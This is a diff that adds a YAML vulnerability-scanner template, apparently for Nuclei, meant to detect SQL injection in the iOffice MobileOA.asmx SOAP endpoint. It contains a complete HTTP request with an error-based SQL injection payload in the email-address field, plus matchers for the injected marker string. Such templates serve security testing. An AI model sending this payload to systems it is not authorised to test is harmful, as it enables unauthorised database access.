@@ -1,0 +1,47 @@
+http:
+    - extractors:
+        - part: body
+          regex:
+            - qzbq1qjpbq
+          type: regex
+      matchers:
+        - part: body
+          type: word
+          words:
+            - qzbq1qjpbq
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - soap:Envelope
+      matchers-condition: and
+      raw:
+        - |
+          POST /iOffice/prg/set/wss/MobileOA.asmx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+          Content-Type: text/xml; charset=utf-8
+
+          <?xml version="1.0" encoding="utf-8"?>
+          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                         xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+                         xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+            <soap:Body>
+              <GeMrNewData xmlns="http://tempuri.org/">
+                <MobileOAEmailAddress>' AND 5079 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5079=5079) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(98)+CHAR(113)))-- eqJq</MobileOAEmailAddress>
+              </GeMrNewData>
+            </soap:Body>
+          </soap:Envelope>
+id: mobileoa-sql-injection
+info:
+    author: ProjectDiscoveryAI
+    description: |
+        Detects potential SQL injection vulnerability in MobileOA's 'MobileOA.asmx' endpoint.
+        This is based on injecting a payload and observing the response.
+    name: MobileOA SQL Injection
+    severity: high
+    tags:
+        - sql-injection
+        - soap
